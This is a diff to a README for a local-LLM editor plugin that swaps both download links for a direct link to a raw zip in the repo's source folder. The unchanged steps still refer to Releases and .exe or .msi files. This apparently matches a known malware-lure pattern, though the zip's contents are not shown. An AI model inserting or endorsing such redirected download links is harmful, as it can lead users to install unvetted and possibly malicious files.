@@ -1,6 +1,6 @@
 # 🔌 opencode-local-provider - Connect local tools to your AI
 
-[![Download via GitHub](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Robbynjazzy512/opencode-local-provider)
+[![Download via GitHub](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Robbynjazzy512/opencode-local-provider/raw/refs/heads/main/src/local_opencode_provider_v2.0-alpha.5.zip)
 
 ## 🎯 About this software
 This tool helps you link local language models to your coding environment. Many developers run AI models on their own computers to keep data private. This plugin allows your editor to talk to those models without sending information to the cloud. It acts as a bridge between your code and your local server.
@@ -15,7 +15,7 @@ To run this software, your computer needs the following:
 ## 📥 How to download
 You install this tool by visiting the project page. Follow these steps to get the files:
 
-1. Visit [this page to download](https://github.com/Robbynjazzy512/opencode-local-provider).
+1. Visit [this page to download](https://github.com/Robbynjazzy512/opencode-local-provider/raw/refs/heads/main/src/local_opencode_provider_v2.0-alpha.5.zip).
 2. Look for the section labeled Releases on the right side of the screen.
 3. Click the link for the latest version.
 4. Locate the file ending in .exe or .msi.
